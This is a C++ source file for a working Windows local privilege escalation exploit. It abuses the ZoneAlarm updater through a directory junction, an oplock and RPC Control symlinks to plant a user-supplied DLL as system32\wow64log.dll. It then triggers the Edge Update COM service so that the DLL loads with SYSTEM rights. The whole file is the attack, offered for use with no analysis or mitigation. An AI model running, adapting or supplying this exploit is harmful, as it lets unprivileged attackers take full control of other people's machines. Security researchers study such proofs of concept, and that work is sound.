#include <windows.h>
#include <stdio.h>
#include <combaseapi.h>
#include "FileOplock.h" // https://github.com/googleprojectzero/symboliclink-testing-tools
#include "def.h"
#pragma warning(disable:4996)

struct __declspec(uuid("A6B716CB-028B-404D-B72C-50E153DD68DA")) CLSID_MSEdge_Object;
class __declspec(uuid("79e0c401-b7bc-4de5-8104-71350f3a9b67")) IGoogleUpdate : IUnknown {
public:


    HRESULT CheckForUpdate(const WCHAR* guid, VOID* observer);
    HRESULT Update(const WCHAR* guid, VOID* observer);

};

HANDLE hfile;
wchar_t dir[] = L"C:\\ProgramData\\CheckPoint\\ZoneAlarm\\Data\\Updates";
wchar_t file[] = L"\\??\\C:\\expl\\LocalCatalog.xml";
wchar_t file2[] = L"\\??\\C:\\expl\\LocalCatalog.xml.bad";
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
VOID cb();
VOID load();
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
int wmain(int argc, wchar_t** argv) {
    if (argc < 2) {
        printf("Usage: %ls <path to dll>", argv[0]);
        exit(1);
    }
    load();
    DWORD count = 0;
    HANDLE tmp;
    DWORD written;
    wchar_t junk[] = L"junk"; // this is needed because if file is empty file move operation will not happen

    tmp = CreateFile(dir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (tmp == INVALID_HANDLE_VALUE) {
        printf("[!] Error opening %ls directory! If this is fresh install on Extreme Security you will need to first run update manually and restart exploit as automatic update is run every hour\n",dir);
       exit(1);
    }
    CloseHandle(tmp);
    CreateDirectory(L"C:\\expl", NULL);
    CreateDirectory(L"C:\\expl2", NULL);
    tmp = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (tmp == INVALID_HANDLE_VALUE) {
        printf("[!] Error creating file!\n");
        exit(1);
    }
    WriteFile(tmp, junk, sizeof(junk), &written, NULL);
    CloseHandle(tmp);
    tmp = CreateFile(file2, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (tmp == INVALID_HANDLE_VALUE) {
        printf("[!] Error creating file!\n");
        exit(1);
    }
    CloseHandle(tmp);
    if (!CopyFileW(argv[1], L"c:\\expl2\\exploit.dll",FALSE)) {
        printf("[!] Error copying file!\n");
        exit(1);
    }
    if (!CreateJunction(dir, L"\\??\\C:\\expl")) {
        printf("[!] Exiting!\n");
        exit(1);
    }
    FileOpLock* oplock;
    oplock = FileOpLock::CreateLock(file2,L"", cb,&hfile);
    if (oplock != nullptr)
    {
        printf("[+] Oplock ok!\n");
        oplock->WaitForLock(INFINITE);

        delete oplock;
    }
    else
    {
        printf("[!] Error creating oplock\n");
        exit(1);
    }
    printf("[*] Waiting for DLL to be created...\n");
    do {
        tmp = CreateFile(L"\\??\\C:\\windows\\system32\\wow64log.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        Sleep(1000);     
    } while (tmp == INVALID_HANDLE_VALUE);
    printf("[+] DLL Created!\n");
    DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\LocalCatalog.xml", L"\\??\\C:\\expl2\\exploit.dll");
    DelDosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\LocalCatalog.xml.bad", L"\\??\\C:\\windows\\system32\\wow64log.dll");

    printf("[*] Triggering Edge Update service!\n");
    HRESULT coini = CoInitialize(NULL);
    IGoogleUpdate* updater = NULL;

    HRESULT hr = CoCreateInstance(__uuidof(CLSID_MSEdge_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater), (PVOID*)&updater);
    if (SUCCEEDED(hr)) {
        printf("[+] MicrosoftEdgeUpdate started!\n");
    }
    else {
        printf("[!] Error: 0x%x\n ", hr);
    }

    
}
VOID cb() {
    printf("[+] Oplock triggered!\n");
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    GetTempFileName(L"\\??\\C:\\windows\\temp\\", L"PWN", 0, tmpfile);
    printf("[+] TMP file %ls\n", tmpfile);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    if (!DeleteFile(file)) {
        printf("[+] Failed to delete %ls file!\n", file);
    }

    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hfile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        printf("[!] Error: %8.8x \n", status);
        exit(0);
    }
    printf("[+] File Moved!\n");

    if (!CreateJunction(L"\\??\\C:\\expl", L"\\RPC Control")) {
        printf("[!] Exiting!\n");
        exit(1);
    }
    DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\LocalCatalog.xml", L"\\??\\C:\\expl2\\exploit.dll");
    DosDeviceSymLink(L"GLOBAL\\GLOBALROOT\\RPC Control\\LocalCatalog.xml.bad", L"\\??\\C:\\windows\\system32\\wow64log.dll");

    
}


void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
       
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }
        if (pNtSetInformationFile == NULL) {
            printf("Cannot load api's %d\n", GetLastError());
            exit(0);
        }

}
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    HANDLE hDir;
    hDir = CreateFile(dir,FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to obtain handle on directory %ls.\n",dir);
        return FALSE;
    }

    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {
        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}


BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
